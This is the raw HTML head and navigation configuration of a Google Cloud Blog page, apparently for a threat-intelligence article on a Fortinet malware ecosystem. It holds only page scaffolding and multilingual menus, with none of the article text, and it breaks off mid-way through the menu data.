<!doctype html><html lang="en-US" dir="ltr"><head><base href="https://cloud.google.com/blog/"><link rel="preconnect" href="//www.gstatic.com"><meta name="referrer" content="origin"><meta name="viewport" content="initial-scale=1, width=device-width"><meta name="track-metadata-page_hosting_platform" content="blog_boq"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="application-name" content="Google Cloud Blog"><meta name="apple-mobile-web-app-title" content="Google Cloud Blog"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="msapplication-tap-highlight" content="no"><link rel="preconnect" href="//fonts.googleapis.com"><link rel="preconnect" href="//fonts.gstatic.com"><link rel="preconnect" href="//www.gstatic.com"><link rel="preconnect" href="//storage.googleapis.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Google+Sans+Text_old:400,500,700,400i,500i,700i"><link rel="manifest" crossorigin="use-credentials" href="_/TransformBlogUi/manifest.json"><link rel="home" href="/?lfhs=2"><link rel="msapplication-starturl" href="/?lfhs=2"><link rel="icon" href="//www.gstatic.com/cloud/images/icons/favicon.ico" sizes="32x32"><link rel="apple-touch-icon-precomposed" href="//www.gstatic.com/cloud/images/icons/favicon.ico" sizes="32x32"><link rel="msapplication-square32x32logo" href="//www.gstatic.com/cloud/images/icons/favicon.ico" sizes="32x32"><script data-id="_gd" nonce="wC8mBVAL5Ft29iPueo1EIg">window.WIZ_global_data = {"Bwo7Jf":"%.@.\"BR\",3]","CGQM5":"%.@.[[1]]]","DpimGf":false,"EP1ykd":["/_/*","/accounts/*","/transform","/transform/*"],"FdrFJe":"2682703644122474351","Im6cmf":"/blog/_/TransformBlogUi","JvMKJd":"%.@.\"GTM-5CVQBG\",[[\"en\",\"\\u202aEnglish\\u202c\",true,\"en\"],[\"de\",\"\\u202aDeutsch\\u202c\",true,\"de\"],[\"es\",\"\\u202aEspañol\\u202c\",true,\"es\"],[\"es-419\",\"\\u202aEspañol (Latinoamérica)\\u202c\",true,\"es-419\"],[\"fr\",\"\\u202aFrançais\\u202c\",true,\"fr\"],[\"id\",\"\\u202aIndonesia\\u202c\",true,\"id\"],[\"it\",\"\\u202aItaliano\\u202c\",true,\"it\"],[\"pt-BR\",\"\\u202aPortuguês (Brasil)\\u202c\",true,\"pt-BR\"],[\"zh-CN\",\"\\u202a简体中文\\u202c\",true,\"zh-Hans\"],[\"zh-TW\",\"\\u202a繁體中文\\u202c\",true,\"zh-Hant\"],[\"ja\",\"\\u202a日本語\\u202c\",true,\"ja\"],[\"ko\",\"\\u202a한국어\\u202c\",true,\"ko\"]],[\"83405\",\"AIzaSyD3LJeW4Q6gtdgJlyeFZUp-GhpIoc6EUeg\"],\"en\",null,null,[],[[\"https://cloud.google.com/innovators\",\"https://cloud.google.com/innovators/plus/activate\",\"https://cloud.google.com/innovators/innovatorsplus\"],[\"https://workspace.google.com/pricing\",\"https://www.x.com/googleworkspace\",\"https://www.facebook.com/googleworkspace\",\"https://www.youtube.com/channel/UCBmwzQnSoj9b6HzNmFrg_yw\",\"https://www.instagram.com/googleworkspace\",\"https://www.linkedin.com/showcase/googleworkspace\",\"https://about.google/?utm_source\\u003dworkspace.google.com\\u0026utm_medium\\u003dreferral\\u0026utm_campaign\\u003dgsuite-footer-en\",\"https://about.google/products/?tip\\u003dexplore\",\"https://workspace.google.com\",\"https://workspace.google.com/contact/?source\\u003dgafb-form-globalnav-en\",\"https://workspace.google.com/business/signup/welcome?hl\\u003den\\u0026source\\u003dgafb-form-globalnav-en\",\"https://workspace.google.com/blog\"],[\"https://www.cloudskillsboost.google\",\"https://www.cloudskillsboost.google?utm_source\\u003dcgc\\u0026utm_medium\\u003dwebsite\\u0026utm_campaign\\u003devergreen\",\"https://www.cloudskillsboost.google/subscriptions?utm_source\\u003dcgc\\u0026utm_medium\\u003dwebsite\\u0026utm_campaign\\u003devergreenlaunchpromo\",\"https://www.cloudskillsboost.google/subscriptions?utm_source\\u003dcgc\\u0026utm_medium\\u003dwebsite\\u0026utm_campaign\\u003devergreen\",\"https://www.cloudskillsboost.google/catalog?utm_source\\u003dcgc\\u0026utm_medium\\u003dwebsite\\u0026utm_campaign\\u003devergreen\",\"https://www.cloudskillsboost.google/paths?utm_source\\u003dcgc\\u0026utm_medium\\u003dwebsite\\u0026utm_campaign\\u003devergreen\"],[\"https://mapsplatform.google.com\"],[\"https://cloud.google.com/developers\",\"https://cloud.google.com/developers/settings?utm_source\\u003dinnovators\"],[\"https://console.cloud.google.com/freetrial\",\"https://console.cloud.google.com/\",\"https://console.cloud.google.com/freetrial?redirectPath\\u003dhttps://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem/\"],[\"https://aitestkitchen.withgoogle.com/signup\",\"https://blog.google/technology/ai/join-us-in-the-ai-test-kitchen/\",\"https://cloud.google.com/ai\"],[\"https://googlecloudplatform.blogspot.com/\",\"https://github.com/GoogleCloudPlatform\",\"https://www.linkedin.com/company/google-cloud\",\"https://twitter.com/googlecloud\",\"https://www.facebook.com/googlecloud\"]],[2024,10,23],[[\"en\",\"x-default\"],\"x-default\"],[null,true],null,\"/blog/topics/threat-intelligence/fortinet-malware-ecosystem/?hl\\u003den\",[\"6LcsrxUqAAAAAFhpR1lXsPN2j2nsTwy6JTbRKzJr\"]]","LVIXXb":1,"LoQv7e":false,"M55kSc":"%.@.]","MT7f9b":[],"MUE6Ne":"TransformBlogUi","PylxI":"%.@.\"cloudblog\",\"topics/threat-intelligence/fortinet-malware-ecosystem\",[\"en\",\"de\",\"fr\",\"ko\",\"ja\"],\"en\",null,\"https://cloud.google.com/blog\",\"blog_article\",\"cloud.google.com\",[\"https://console.cloud.google.com/freetrial/\",\"https://cloud.google.com/contact/\",\"https://cloud.google.com/\",\"https://cloud.google.com/blog\",\"https://cloud.google.com/\",\"https://www.google.com/\",\"https://cloud.google.com/products/\",\"https://about.google.com/products/\",\"https://about.google/intl/en/\",\"https://support.google.com\"],[\"googlecloud\",\"googlecloud\",\"showcase/google-cloud\",\"googlecloud/\",\"googlecloud/\"],true]","QrtxK":"","S06Grb":"","S6lZl":105833389,"TSDtV":"%.@.[[null,[[45449427,null,null,null,\"default\",null,\"nYzPw\"],[45449436,null,false,null,null,null,\"NCoWOd\"],[45449424,null,null,null,\"default\",null,\"PB4oCc\"],[45532645,null,true,null,null,null,\"wFnpse\"],[45643590,null,false,null,null,null,\"w7jzef\"],[45449433,null,true,null,null,null,\"BotAtd\"],[45662378,null,false,null,null,null,\"DG71uf\"],[45449442,null,true,null,null,null,\"dsKk4d\"],[45449449,null,true,null,null,null,\"b5B1L\"],[45459555,null,false,null,null,null,\"Imeoqb\"],[45646404,null,false,null,null,null,\"tfPPe\"],[45651445,null,false,null,null,null,\"XzXOC\"],[45449440,null,false,null,null,null,\"j9nUqf\"],[45631885,null,false,null,null,null,\"kG32O\"],[45449445,null,true,null,null,null,\"C4H3Td\"],[45649370,null,false,null,null,null,\"LibkZ\"],[45657332,null,false,null,null,null,\"oBUucf\"],[45449438,null,false,null,null,null,\"m0uJSe\"],[45449471,null,null,null,\"default\",null,\"Ammqqf\"],[45612748,null,false,null,null,null,\"fdXYmb\"],[45449467,null,null,null,\"variant4\",null,\"qL2Vf\"],[45449469,null,null,null,\"default\",null,\"mBNY1\"],[45449437,null,true,null,null,null,\"tuBYEc\"],[45449443,null,false,null,null,null,\"wvKxS\"],[45616194,null,false,null,null,null,\"y3jdm\"],[45449434,null,true,null,null,null,\"PvZHQ\"],[45449428,null,null,null,\"default\",null,\"cbPi4d\"],[45449423,null,null,null,\"default\",null,\"FIJFKf\"],[45449450,null,false,null,null,null,\"PTNaKe\"],[45632110,null,true,null,null,null,\"QK58Od\"],[45449435,null,false,null,null,null,\"s7Z7Ld\"],[45449446,null,true,null,null,null,\"ktxJzc\"],[45449468,null,null,null,\"variant4\",null,\"BUEcUe\"],[45659313,null,false,null,null,null,\"i2rGv\"],[45532646,null,true,null,null,null,\"RIvlU\"],[45449439,null,true,null,null,null,\"lsuui\"],[45650156,null,false,null,null,null,\"Pr5Lcf\"],[45449422,null,null,null,\"default\",null,\"epsxQe\"],[45628378,null,true,null,null,null,\"hRRuzd\"],[45651724,null,true,null,null,null,\"xYDLRc\"],[45449444,null,true,null,null,null,\"HGJqie\"],[45655733,null,false,null,null,null,\"xPTOyb\"]],\"CAMSHx0a7s2IEJr+BOrvF/2KA82ttBKhkOMGCrOcDQrJ9A0\\u003d\"]]]","UUFaWc":"%.@.null,1000,2]","Vvafkd":false,"Yllh3e":"%.@.1729742708065482,4736827,2234633017]","aAofAd":"%.@.[[[\"Solutions \\u0026 technology\",null,[[[\"AI \\u0026 Machine Learning\",\"/blog/products/ai-machine-learning\"],[\"API Management\",\"/blog/products/api-management\"],[\"Application Development\",\"/blog/products/application-development\"],[\"Application Modernization\",\"/blog/products/application-modernization\"],[\"Chrome Enterprise\",\"/blog/products/chrome-enterprise\"],[\"Compute\",\"/blog/products/compute\"],[\"Containers \\u0026 Kubernetes\",\"/blog/products/containers-kubernetes\"],[\"Data Analytics\",\"/blog/products/data-analytics\"],[\"Databases\",\"/blog/products/databases\"],[\"DevOps \\u0026 SRE\",\"/blog/products/devops-sre\"],[\"Maps \\u0026 Geospatial\",\"/blog/topics/maps-geospatial\"],[\"Security\",null,[[[\"Security \\u0026 Identity\",\"/blog/products/identity-security\"],[\"Threat Intelligence\",\"/blog/topics/threat-intelligence\"]]]],[\"Infrastructure\",\"/blog/products/infrastructure\"],[\"Infrastructure Modernization\",\"/blog/products/infrastructure-modernization\"],[\"Networking\",\"/blog/products/networking\"],[\"Productivity \\u0026 Collaboration\",\"/blog/products/productivity-collaboration\"],[\"SAP on Google Cloud\",\"/blog/products/sap-google-cloud\"],[\"Storage \\u0026 Data Transfer\",\"/blog/products/storage-data-transfer\"],[\"Sustainability\",\"/blog/topics/sustainability\"]]]],[\"Ecosystem\",null,[[[\"IT Leaders\",\"/transform\"],[\"Industries\",null,[[[\"Financial Services\",\"/blog/topics/financial-services\"],[\"Healthcare \\u0026 Life Sciences\",\"/blog/topics/healthcare-life-sciences\"],[\"Manufacturing\",\"/blog/topics/manufacturing\"],[\"Media \\u0026 Entertainment\",\"/blog/products/media-entertainment\"],[\"Public Sector\",\"/blog/topics/public-sector\"],[\"Retail\",\"/blog/topics/retail\"],[\"Supply Chain\",\"/blog/topics/supply-chain-logistics\"],[\"Telecommunications\",\"/blog/topics/telecommunications\"]]]],[\"Partners\",\"/blog/topics/partners\"],[\"Startups \\u0026 SMB\",\"/blog/topics/startups\"],[\"Training \\u0026 Certifications\",\"/blog/topics/training-certifications\"],[\"Inside Google Cloud\",\"/blog/topics/inside-google-cloud\"],[\"Google Cloud Next \\u0026 Events\",\"/blog/topics/google-cloud-next\"],[\"Google Maps Platform\",\"https://mapsplatform.google.com/resources/blog/\"],[\"Google Workspace\",\"https://workspace.google.com/blog\"]]]],[\"Developers \\u0026 Practitioners\",\"/blog/topics/developers-practitioners\"],[\"Transform with Google Cloud\",\"/transform\"]]],[[\"de\",[[[\"Neuigkeiten\",\"/blog/de/topics/whats-new/aktuelles-auf-dem-google-cloud-blog\"],[\"Lösungen \\u0026 Technologien\",null,[[[\"Anwendungsentwicklung\",\"/blog/de/products/application-development\"],[\"Anwendungsmodernisierung\",\"/blog/de/products/anwendungsmodernisierung\"],[\"API-Verwaltung\",\"/blog/de/products/api-management\"],[\"Chrome Enterprise\",\"/blog/de/products/chrome-enterprise\"],[\"Computing\",\"/blog/de/products/compute\"],[\"Containers \\u0026 Kubernetes\",\"/blog/de/products/containers-kubernetes\"],[\"Datenanalysen\",\"/blog/de/products/data-analytics\"],[\"Datenbanken\",\"/blog/de/products/databases\"],[\"DevOps \\u0026 SRE\",\"/blog/de/products/devops-sre\"],[\"Infrastruktur\",\"/blog/de/products/infrastructure\"],[\"KI \\u0026 Machine Learning\",\"/blog/de/products/ai-machine-learning\"],[\"Maps \\u0026 Geospatial\",\"/blog/de/topics/maps-geospatial\"],[\"Modernisierung der Infrastruktur\",\"/blog/de/products/modernisierung-der-infrastruktur\"],[\"Nachhaltigkeit\",\"/blog/de/topics/nachhaltigkeit\"],[\"Netzwerk\",\"/blog/de/products/networking\"],[\"Produktivität und Zusammenarbeit\",\"/blog/de/products/produktivitaet-und-kollaboration\"],[\"SAP in Google Cloud\",\"/blog/de/products/sap-google-cloud\"],[\"Sicherheit \\u0026 Identität\",\"/blog/de/products/identity-security\"],[\"Speicher und Datentransfer\",\"/blog/de/products/storage-data-transfer\"]]]],[\"Ökosystem\",null,[[[\"IT Leader\",\"/transform/de\"],[\"Industrien\",null,[[[\"Behörden und öffentlicher Sektor\",\"/blog/de/topics/public-sector\"],[\"Einzelhandel\",\"/blog/de/topics/retail\"],[\"Fertigung\",\"/blog/de/topics/fertigung\"],[\"Finanzdienstleistungen\",\"/blog/de/topics/financial-services\"],[\"Gesundheitswesen und Biowissenschaften\",\"/blog/de/topics/healthcare-life-sciences\"],[\"Lieferkette und Logistik\",\"/blog/de/topics/lieferkette-und-logistik\"],[\"Medien und Unterhaltung\",\"/blog/de/products/media-entertainment\"],[\"Telekommunikation\",\"/blog/de/topics/telecommunications\"]]]],[\"Entwickler*innen \\u0026 Fachkräfte\",\"/blog/de/topics/developers-practitioners\"],[\"Google Cloud Next \\u0026 Events\",\"/blog/de/topics/events\"],[\"Google Maps Platform\",\"/blog/de/products/maps-platform\"],[\"Google Workspace\",\"https://workspace.google.com/blog/de\"],[\"Inside Google Cloud\",\"/blog/de/topics/inside-google-cloud\"],[\"Kunden\",\"/blog/de/topics/kunden\"],[\"Partner\",\"/blog/de/topics/partners\"],[\"Start-ups und KMU\",\"/blog/de/topics/startups\"],[\"Training und Zertifizierung\",\"/blog/de/topics/training-certifications\"]]]],[\"Transformation mit Google Cloud\",\"/transform/de\"]]]],[\"en\",[[[\"Solutions \\u0026 technology\",null,[[[\"AI \\u0026 Machine Learning\",\"/blog/products/ai-machine-learning\"],[\"API Management\",\"/blog/products/api-management\"],[\"Application Development\",\"/blog/products/application-development\"],[\"Application Modernization\",\"/blog/products/application-modernization\"],[\"Chrome Enterprise\",\"/blog/products/chrome-enterprise\"],[\"Compute\",\"/blog/products/compute\"],[\"Containers \\u0026 Kubernetes\",\"/blog/products/containers-kubernetes\"],[\"Data Analytics\",\"/blog/products/data-analytics\"],[\"Databases\",\"/blog/products/databases\"],[\"DevOps \\u0026 SRE\",\"/blog/products/devops-sre\"],[\"Maps \\u0026 Geospatial\",\"/blog/topics/maps-geospatial\"],[\"Security\",null,[[[\"Security \\u0026 Identity\",\"/blog/products/identity-security\"],[\"Threat Intelligence\",\"/blog/topics/threat-intelligence\"]]]],[\"Infrastructure\",\"/blog/products/infrastructure\"],[\"Infrastructure Modernization\",\"/blog/products/infrastructure-modernization\"],[\"Networking\",\"/blog/products/networking\"],[\"Productivity \\u0026 Collaboration\",\"/blog/products/productivity-collaboration\"],[\"SAP on Google Cloud\",\"/blog/products/sap-google-cloud\"],[\"Storage \\u0026 Data Transfer\",\"/blog/products/storage-data-transfer\"],[\"Sustainability\",\"/blog/topics/sustainability\"]]]],[\"Ecosystem\",null,[[[\"IT Leaders\",\"/transform\"],[\"Industries\",null,[[[\"Financial Services\",\"/blog/topics/financial-services\"],[\"Healthcare \\u0026 Life Sciences\",\"/blog/topics/healthcare-life-sciences\"],[\"Manufacturing\",\"/blog/topics/manufacturing\"],[\"Media \\u0026 Entertainment\",\"/blog/products/media-entertainment\"],[\"Public Sector\",\"/blog/topics/public-sector\"],[\"Retail\",\"/blog/topics/retail\"],[\"Supply Chain\",\"/blog/topics/supply-chain-logistics\"],[\"Telecommunications\",\"/blog/topics/telecommunications\"]]]],[\"Partners\",\"/blog/topics/partners\"],[\"Startups \\u0026 SMB\",\"/blog/topics/startups\"],[\"Training \\u0026 Certifications\",\"/blog/topics/training-certifications\"],[\"Inside Google Cloud\",\"/blog/topics/inside-google-cloud\"],[\"Google Cloud Next \\u0026 Events\",\"/blog/topics/google-cloud-next\"],[\"Google Maps Platform\",\"https://mapsplatform.google.com/resources/blog/\"],[\"Google Workspace\",\"https://workspace.google.com/blog\"]]]],[\"Developers \\u0026 Practitioners\",\"/blog/topics/developers-practitioners\"],[\"Transform with Google Cloud\",\"/transform\"]]]],[\"fr\",[[[\"Les tendances\",\"/blog/fr/topics/les-tendances/quelles-sont-les-nouveautes-de-google-cloud\"],[\"Solutions et Technologie\",null,[[[\"Analyse de données\",\"/blog/fr/products/analyse-de-donnees/\"],[\"Bases de données\",\"/blog/fr/products/databases\"],[\"Calcul\",\"/blog/fr/products/calcul/\"],[\"Chrome Entreprise\",\"/blog/fr/products/chrome-enterprise/\"],[\"Conteneurs et Kubernetes\",\"/blog/fr/products/conteneurs-et-kubernetes/\"],[\"Développement d\u0027Applications\",\"/blog/fr/products/application-development\"],[\"Développement durable\",\"/blog/fr/topics/developpement-durable\"],[\"DevOps et ingénierie SRE\",\"/blog/fr/products/devops-sre\"],[\"Gestion des API\",\"/blog/fr/products/api-management\"],[\"IA et Machine Learning\",\"/blog/fr/products/ai-machine-learning\"],[\"Infrastructure\",\"/blog/fr/products/infrastructure\"],[\"Maps et Géospatial\",\"/blog/fr/topics/maps-geospatial\"],[\"Modernisation d\u0027Applications\",\"/blog/fr/products/modernisation-dapplications/\"],[\"Modernisation d\u0027Infrastructure\",\"/blog/fr/products/modernisation-dinfrastructure/\"],[\"Networking\",\"/blog/fr/products/networking\"],[\"Productivité et Collaboration\",\"/blog/fr/products/productivite-et-collaboration\"],[\"SAP sur Google Cloud\",\"/blog/fr/products/sap-google-cloud\"],[\"Sécurité et Identité\",\"/blog/fr/products/identity-security\"],[\"Stockage et transfert de données\",\"/blog/fr/products/storage-data-transfer\"]]]],[\"Écosystème\",null,[[[\"Responsables IT\",\"/transform/fr\"],[\"Industries\",null,[[[\"Commerce\",\"/blog/fr/topics/retail\"],[\"Manufacturing\",\"/blog/fr/topics/manufacturing\"],[\"Médias et Divertissement\",\"/blog/fr/products/media-entertainment\"],[\"Santé\",\"/blog/fr/topics/healthcare-life-sciences\"],[\"Secteur Public\",\"/blog/fr/topics/public-sector\"],[\"Services Financiers\",\"/blog/fr/topics/financial-services\"],[\"Supply Chain\",\"/blog/fr/topics/supply-chain/\"],[\"Telecommunications\",\"/blog/fr/topics/telecommunications\"]]]],[\"Clients\",\"/blog/fr/topics/clients/\"],[\"Développeurs et professionnels\",\"/blog/fr/topics/developers-practitioners\"],[\"Formations et certifications\",\"/blog/fr/topics/training-certifications\"],[\"Google Cloud Next et Événements\",\"/blog/fr/topics/evenements\"],[\"Google Maps Platform\",\"/blog/fr/products/maps-platform\"],[\"Google Workspace\",\"https://workspace.google.com/blog/fr\"],[\"Inside Google Cloud\",\"/blog/fr/topics/inside-google-cloud\"],[\"Partenaires\",\"/blog/fr/topics/partners\"],[\"Start-ups et PME\",\"/blog/fr/topics/startups\"]]]],[\"Transformer avec Google Cloud\",\"/transform/fr\"]]]],[\"ja\",[[[\"ソリューションとテクノロジー\",null,[[[\"AI \\u0026 機械学習\",\"/blog/ja/products/ai-machine-learning\"],[\"API 管理\",\"/blog/ja/products/api-management\"],[\"アプリケーション開発\",\"/blog/ja/products/application-development\"],[\"アプリケーション モダナイゼーション\",\"/blog/ja/products/application-modernization\"],[\"Chrome Enterprise\",\"/blog/ja/products/chrome-enterprise\"],[\"コンピューティング\",\"/blog/ja/products/compute\"],[\"Containers \\u0026 Kubernetes\",\"/blog/ja/products/containers-kubernetes\"],[\"データ分析\",\"/blog/ja/products/data-analytics\"],[\"データベース\",\"/blog/ja/products/databases\"],[\"DevOps \\u0026 SRE\",\"/blog/ja/products/devops-sre\"],[\"Maps \\u0026 Geospatial\",\"/blog/ja/products/maps-platform\"],[\"セキュリティ\",null,[[[\"セキュリティ \\u0026 アイデンティティ\",\"/blog/ja/products/identity-security\"],[\"脅威インテリジェンス\",\"/blog/ja/topics/threat-intelligence\"]]]],[\"インフラストラクチャ\",\"/blog/ja/products/infrastructure\"],[\"インフラ モダナイゼーション\",\"/blog/ja/products/infrastructure-modernization\"],[\"ネットワーキング\",\"/blog/ja/products/networking\"],[\"生産性とコラボレーション\",\"/blog/ja/products/productivity-collaboration\"],[\"Google Cloud での SAP\",\"/blog/ja/products/sap-google-cloud\"],[\"ストレージとデータ転送\",\"/blog/ja/products/storage-data-transfer\"],[\"サステナビリティ\",\"/blog/ja/topics/sustainability\"]]]],[\"エコシステム\",null,[[[\"ITリーダー\",\"/transform/ja\"],[\"業種\",null,[[[\"金融サービス\",\"/blog/ja/topics/financial-services\"],[\"ヘルスケア、ライフ サイエンス\",\"/blog/ja/topics/healthcare-life-sciences\"],[\"製造\",\"/blog/ja/topics/manufacturing\"],[\"メディア、エンターテイメント\",\"/blog/ja/products/media-entertainment\"],[\"公共部門\",\"/blog/ja/topics/public-sector\"],[\"小売業\",\"/blog/ja/topics/retail\"],[\"サプライ チェーン\",\"/blog/ja/topics/supply-chain-logistics\"],[\"通信\",\"/blog/ja/topics/telecommunications\"]]]],[\"顧客事例\",\"/blog/ja/topics/customers\"],[\"パートナー\",\"/blog/ja/topics/partners\"],[\"スタートアップ \\u0026 SMB\",\"/blog/ja/topics/startups\"],[\"トレーニングと認定\",\"/blog/ja/topics/training-certifications\"],[\"Inside Google Cloud\",\"/blog/ja/topics/inside-google-cloud\"],[\"Google Cloud Next と イベント\",\"/blog/ja/topics/google-cloud-next\"],[\"Google Maps Platform\",\"/blog/ja/products/maps-platform\"],[\"Google Workspace\",\"https://workspace.google.com/blog/ja\"]]]],[\"デベロッパー\",\"/blog/ja/topics/developers-practitioners\"],[\"Transform with Google Cloud\",\"/transform/ja\"]]]],[\"ko\",[[[\"솔루션 및 기술\",null,[[[\"AI 및 머신러닝\",\"/blog/ko/products/ai-machine-learning\"],[\"API 관리\",\"/blog/ko/products/api-management\"],[\"애플리케이션 개발\",\"/blog/ko/products/application-development\"],[\"애플리케이션 현대화\",\"/blog/ko/products/application-modernization\"],[\"Chrome Enterprise\",\"/blog/products/chrome-enterprise\"],[\"컴퓨팅\",\"/blog/ko/products/compute\"],[\"컨테이너 \\u0026 Kubernetes\",\"/blog/ko/products/containers-kubernetes\"],[\"데이터 분석\",\"/blog/ko/products/data-analytics\"],[\"데이터베이스\",\"/blog/ko/products/databases\"],[\"DevOps 및 SRE\",\"/blog/ko/products/devops-sre\"],[\"Maps \\u0026 Geospatial\",\"/blog/ko/products/maps-platform\"],[\"보안\",null,[[[\"보안 \\u0026 아이덴티티\",\"/blog/ko/products/identity-security\"],[\"위협 인텔리전스\",\"/blog/ko/topics/threat-intelligence\"]]]],[\"인프라\",\"/blog/ko/products/infrastructure\"],[\"Infrastructure Modernization\",\"/blog/ko/products/infrastructure-modernization\"],[\"네트워킹\",\"/blog/ko/products/networking\"],[\"생산성 및 공동작업\",\"/blog/ko/products/productivity-collaboration\"],[\"SAP on Google Cloud\",\"/blog/ko/products/sap-google-cloud\"],[\"스토리지 및 데이터 전송\",\"/blog/ko/products/storage-data-transfer\"],[\"지속가능성\",\"/blog/ko/topics/sustainability\"]]]],[\"에코시스템\",null,[[[\"IT Leaders\",\"/transform/ko\"],[\"업종\",null,[[[\"금융 서비스\",\"/blog/ko/topics/financial-services\"],[\"의료 및 생명과학\",\"/blog/ko/topics/healthcare-life-sciences\"],[\"제조업\",\"/blog/ko/topics/manufacturing\"],[\"미디어 및 엔터테인먼트\",\"/blog/ko/products/media-entertainment\"],[\"공공부문\",\"/blog/ko/topics/public-sector\"],[\"소매업\",\"/blog/ko/topics/retail\"],[\"공급망\",\"/blog/topics/supply-chain-logistics\"],[\"통신\",\"/blog/ko/topics/telecommunications\"]]]],[\"고객 사례\",\"/blog/ko/topics/customers\"],[\"파트너\",\"/blog/ko/topics/partners\"],[\"스타트업 \\u0026 SMB\",\"/blog/ko/topics/startups\"],[\"교육 \\u0026 인증\",\"/blog/ko/topics/training-certifications\"],[\"Inside Google Cloud\",\"/blog/ko/topics/inside-google-cloud\"],[\"Google Cloud Next 및 이벤트\",\"/blog/ko/topics/google-cloud-next\"],[\"Google Maps Platform\",\"/blog/ko/products/maps-platform\"],[\"Google Workspace\",\"https://workspace.google.com/blog/ko\"]]]],[\"개발 및 IT운영\",\"/blog/ko/topics/developers-practitioners\"],[\"Google Cloud와 함께 하는 디지털 혁신\",\"/transform/ko\"]]]]]]","cfb2h":"boq_cloudx-web-blog-uiserver_20241022.07_p0","eptZe":"/blog/_/TransformBlogUi/","f8POw":"%.@.[48830069,97684531,97785984,97517168,97442195,48897392,97656895,97863170,93874000,48554503,1706538,97535270,1714252,93778619,48887078,97716263,48489833,97684517,97785970,97517154,97442181,97656881,93873986,48887064],null,null,null,null,true]","fPDxwd":[97517168,97684531,97863170],"gGcLoe":false,"iCzhFc":false,"nQyAE":{"b5B1L":"true","PTNaKe":"false","ktxJzc":"true","BUEcUe":"variant4","XzXOC":"false","kG32O":"false","C4H3Td":"true","oBUucf":"false","Pr5Lcf":"false","j9nUqf":"false","wvKxS":"false","wFnpse":"true","tfPPe":"false","LibkZ":"false","m0uJSe":"false","PvZHQ":"true","s7Z7Ld":"false","i2rGv":"false","RIvlU":"true","lsuui":"true","HGJqie":"true","NCoWOd":"false","dsKk4d":"true","fdXYmb":"false","y3jdm":"false","xPTOyb":"false","BotAtd":"true"},"p9hQne":"https://www.gstatic.com/_/boq-cloudx-web-blog/_/r/","qwAQke":"TransformBlogUi","rtQCxc":180,"u4g7r":"%.@.null,1000,2]","vJ2GOe":"%.@.null,[[\"de\",[[[\"Themen\",null,[[[\"Product Announcements\",\"/blog/de/product-announcements\"],[\"KI \\u0026 Machine Learning\",\"/blog/de/ai-machine-learning\"],[\"Produktivität und Kollaboration\",\"/blog/de/productivity-collaboration\"],[\"Identität und Sicherheit\",\"/blog/de/identity-and-security\"],[\"Future of Work\",\"/blog/de/future-of-work\"],[\"Hybrides Arbeiten\",\"/blog/de/hybrid-work\"],[\"Kundenreferenzen\",\"/blog/de/customer-stories\"],[\"Entwickler*innen und Fachkräfte\",\"/blog/de/developers-practitioners\"],[\"Partner\",\"/blog/de/partners\"],[\"Events\",\"/blog/de/events\"],[\"Öffentlicher Sektor\",\"/blog/de/public-sector\"]]]],[\"Produktneuigkeiten\",null,[[[\"Gmail\",\"/blog/de/gmail\"],[\"Meet\",\"/blog/de/meet\"],[\"Chat and Spaces\",\"/blog/de/chat-spaces\"],[\"Drive\",\"/blog/de/drive\"],[\"Docs\",\"/blog/de/docs\"],[\"Sheets\",\"/blog/de/sheets\"]]]]]]],[\"en\",[[[\"Topics\",null,[[[\"Product Announcements\",\"/blog/product-announcements\"],[\"AI and Machine Learning\",\"/blog/ai-machine-learning\"],[\"Productivity and Collaboration\",\"/blog/productivity-collaboration\"],[\"Identity and Security\",\"/blog/identity-and-security\"],[\"Future of Work\",\"/blog/future-of-work\"],[\"Hybrid Work\",\"/blog/hybrid-work\"],[\"Customer Stories\",\"/blog/customer-stories\"],[\"Developers and Practitioners\",\"/blog/developers-practitioners\"],[\"Partners\",\"/blog/partners\"],[\"Events\",\"/blog/events\"],[\"Public Sector\",\"/blog/public-sector\"]]]],[\"Product News\",null,[[[\"Gmail\",\"/blog/gmail\"],[\"Meet\",\"/blog/meet\"],[\"Chat and Spaces\",\"/blog/chat-spaces\"],[\"Drive\",\"/blog/drive\"],[\"Docs\",\"/blog/docs\"],[\"Sheets\",\"/blog/sheets\"]]]]]]],[\"fr\",[[[\"Thèmes\",null,[[[\"Product Announcements\",\"/blog/fr/product-announcements\"],[\"IA et Machine Learning\",\"/blog/fr/ai-machine-learning\"],[\"Productivité et Collaboration\",\"/blog/fr/productivity-collaboration\"],[\"Identité et Sécurité\",\"/blog/fr/identity-and-security\"],[\"L\u0027avenir du travail\",\"/blog/fr/future-of-work\"],[\"Travail hybride\",\"/blog/fr/hybrid-work\"],[\"Témoignages Clients\",\"/blog/fr/customer-stories\"],[\"Développeurs et professionnels\",\"/blog/fr/developers-practitioners\"],[\"Partenaires\",\"/blog/fr/partners\"],[\"Événements\",\"/blog/fr/events\"],[\"Secteur Public\",\"/blog/fr/public-sector\"]]]],[\"Annonces sur les produits\",null,[[[\"Gmail\",\"/blog/fr/gmail\"],[\"Meet\",\"/blog/fr/meet\"],[\"Chat et Spaces\",\"/blog/fr/chat-spaces\"],[\"Drive\",\"/blog/fr/drive\"],[\"Docs\",\"/blog/fr/docs\"],[\"Sheets\",\"/blog/fr/sheets\"]]]]]]],[\"ja\",[[[\"トピック\",null,[[[\"プロダクトの発表\",\"/blog/ja/product-announcements\"],[\"AI \\u0026 機械学習\",\"/blog/ja/ai-machine-learning\"],[\"生産性とコラボレーション\",\"/blog/ja/productivity-collaboration\"],[\"アイデンティティとセキュリティ\",\"/blog/ja/identity-and-security\"],[\"未来の働き方\",\"/blog/ja/future-of-work\"],[\"ハイブリッドな働き方\",\"/blog/ja/hybrid-work\"],[\"顧客事例\",\"/blog/ja/customer-stories\"],[\"デベロッパー\",\"/blog/ja/developers-practitioners\"],[\"パートナー\",\"/blog/ja/partners\"],[\"イベント\",\"/blog/ja/events\"],[\"公共部門\",\"/blog/ja/public-sector\"]]]],[\"製品ニュース\",null,[[[\"Gmail\",\"/blog/ja/gmail\"],[\"Meet\",\"/blog/ja/meet\"],[\"Chat and Spaces\",\"/blog/ja/chat-spaces\"],[\"ドライブ\",\"/blog/ja/drive\"],[\"ドキュメント\",\"/blog/ja/docs\"],[\"スプレッドシート\",\"/blog/ja/sheets\"]]]]]]],[\"ko\",[[[\"주제\",null,[[[\"제품 업데이트\",\"/blog/ko/product-announcements\"],[\"AI 및 머신러닝\",\"/blog/ko/ai-machine-learning\"],[\"생산성 및 